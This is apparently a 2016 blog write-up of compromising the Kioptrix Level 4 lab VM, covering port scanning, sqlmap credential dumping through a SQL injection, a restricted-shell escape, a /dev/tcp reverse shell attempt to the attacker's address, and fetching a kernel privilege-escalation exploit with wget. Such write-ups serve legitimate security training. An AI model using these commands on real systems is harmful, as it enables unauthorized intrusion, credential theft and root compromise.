---
layout: post
title: "Vulhub Kioptrix Level 4"
date: 2016-06-15 16:10:59 -0500
comments: true
categories: [vulhub, kioptrix]
---

###Tools:

* netdiscover
* Nmap
* wfuzz
* nikto
* zap
* Burpsuite
* Sqlmap


<!--more-->
Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.79.0/24`

{% img  /images/blog/vulhub/kioptrix4/Selection_001.png   [title manually exploit [alt text]] %}

192.168.79.190 is the target.


Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.79.190 -p-`

```
# nmap -sV -v -O -A -T5 192.168.79.190 -p-

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-15 16:14 CDT
NSE: Loaded 138 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:14
Completed NSE at 16:14, 0.00s elapsed
Initiating NSE at 16:14
Completed NSE at 16:14, 0.00s elapsed
Initiating ARP Ping Scan at 16:14
Scanning 192.168.79.190 [1 port]
Completed ARP Ping Scan at 16:14, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:14
Completed Parallel DNS resolution of 1 host. at 16:14, 1.99s elapsed
Initiating SYN Stealth Scan at 16:14
Scanning 192.168.79.190 [65535 ports]
Discovered open port 445/tcp on 192.168.79.190
Discovered open port 139/tcp on 192.168.79.190
Discovered open port 80/tcp on 192.168.79.190
Discovered open port 22/tcp on 192.168.79.190
Completed SYN Stealth Scan at 16:14, 11.91s elapsed (65535 total ports)
Initiating Service scan at 16:14
Scanning 4 services on 192.168.79.190
Completed Service scan at 16:14, 11.02s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.79.190
NSE: Script scanning 192.168.79.190.
Initiating NSE at 16:14
Completed NSE at 16:15, 15.56s elapsed
Initiating NSE at 16:15
Completed NSE at 16:15, 0.01s elapsed
Nmap scan report for 192.168.79.190
Host is up (0.00033s latency).
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:EA:4D:22 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 0.001 days (since Wed Jun 15 16:13:14 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=203 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX4<00>        Flags: <unique><active>
|   KIOPTRIX4<03>        Flags: <unique><active>
|   KIOPTRIX4<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|_  WORKGROUP<00>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2016-06-15T17:15:00-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.33 ms 192.168.79.190

NSE: Script Post-scanning.
Initiating NSE at 16:15
Completed NSE at 16:15, 0.00s elapsed
Initiating NSE at 16:15
Completed NSE at 16:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.54 seconds
           Raw packets sent: 91558 (4.029MB) | Rcvd: 39548 (1.583MB)

```

Services ssh, http and smb are running.


###check HTTP service:

use wfuzz to scan:

`wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.190/FUZZ 2>/dev/null`

{% img  /images/blog/vulhub/kioptrix4/Selection_002.png   [title manually exploit [alt text]] %}

use nikto to scan:

{% img  /images/blog/vulhub/kioptrix4/Selection_003.png   [title manually exploit [alt text]] %}



###check SMB service:

use enum4linux to enumerate SMB:

`enum4linux -a 192.168.79.190`

{% img  /images/blog/vulhub/kioptrix4/Selection_004.png   [title manually exploit [alt text]] %}


I searched exploitdb and metasploit and tried serveral exploits to SMB, failed.



Now I turn to http service.

use zap to scan:

{% img  /images/blog/vulhub/kioptrix4/Selection_005.png   [title manually exploit [alt text]] %}


Looks like there is a SQL injection in parameter mypassword.


use Burp to check:

{% img  /images/blog/vulhub/kioptrix4/Selection_006.png   [title manually exploit [alt text]] %}


save the POST request to a file called test.txt

run sqlmap to dump the credential:


`sqlmap -r test.txt -p mypassword --dump`

get:

{% img  /images/blog/vulhub/kioptrix4/Selection_007.png   [title manually exploit [alt text]] %}

now try to login to web and see if I can upload webshell:

{% img  /images/blog/vulhub/kioptrix4/Selection_008.png   [title manually exploit [alt text]] %}

{% img  /images/blog/vulhub/kioptrix4/Selection_009.png   [title manually exploit [alt text]] %}

Nothing excited.

Okay, try to login via SSH:

{% img  /images/blog/vulhub/kioptrix4/Selection_010.png   [title manually exploit [alt text]] %}


It is an limited shell:

'ls -ahlR /root/'

{% img  /images/blog/vulhub/kioptrix4/Selection_012.png   [title manually exploit [alt text]] %}



After google it, I found it may be lshell

[lshell](https://github.com/ghantoos/lshell)

lshell is a shell coded in Python, that lets you restrict a user's environment to limited sets of commands, choose to enable/disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user's commands, implement timing restriction, and more. 

looks like it support command echo, try to get bash:

`echo os.system("/bin/bash")`

{% img  /images/blog/vulhub/kioptrix4/Selection_011.png   [title manually exploit [alt text]] %}

Got the shell now!

start to get root...

Enumeration stage,

`uname -a`

{% img  /images/blog/vulhub/kioptrix4/Selection_013.png   [title manually exploit [alt text]] %}

`searchsploit linux kernel 2.6 | grep local` and I pick sendpage one 

{% img  /images/blog/vulhub/kioptrix4/Selection_014.png   [title manually exploit [alt text]] %}

download the exploit to /var/www/html/:

`wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/9641.tar.gz`

start web server:

`service apache2 start`

in kioptrix4 

`wget http://192.168.79.173/9641.tar.gz`

hang there, maybe iptable block the traffic to port 80

{% img  /images/blog/vulhub/kioptrix4/Selection_015.png   [title manually exploit [alt text]] %}

I tried `/bin/bash -i > /dev/tcp/192.168.79.173/1234 0<&1` also doesn't work

finally I used python SimpleHTTPServer:

`service apache2 stop`
`python -m SimpleHTTPServer`

in kioptrix4 

`wget 192.168.79.173:8000/9641.tar.gz`

unzip it:

`tar zxvf 9641.tar.gz`

try to compile it, cannot find gcc. WTF

search it

`whereis gcc`

{% img  /images/blog/vulhub/kioptrix4/Selection_016.png   [title manually exploit [alt text]] %}

this is a folder, and it is i486-linux-gnu, check kioptrix4's architecture.

`uname -m`
It is i686. Oh different....

Luckly, my kali is i686, I just compile on my kali and upload to kioptrix4


run it 

get the root:

{% img  /images/blog/vulhub/kioptrix4/Selection_017.png   [title manually exploit [alt text]] %}






















